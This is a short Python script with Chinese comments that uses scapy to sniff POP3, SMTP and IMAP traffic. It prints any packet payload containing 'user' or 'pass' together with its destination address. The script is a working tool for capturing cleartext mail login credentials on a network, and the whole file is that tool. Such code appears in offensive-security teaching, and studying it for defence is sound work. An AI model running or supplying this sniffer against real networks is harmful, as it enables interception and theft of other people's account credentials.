from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    print(packet.show())

    # 检查是否有数据载荷
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f'[*] Destination: {packet[IP].dst}')
            print(f'[*] {str(packet[TCP].payload)}')

def main():
    # 仅监听端口110 (POP3), 25 (SMTP), 143 (IMAP)
    filter_condition = 'tcp port 110 or tcp port 25 or tcp port 143'
    # store=0不将数据包保存在内存里
    sniff(filter=filter_condition, prn=packet_callback, count=1, store=0)

if __name__ == '__main__':
    main()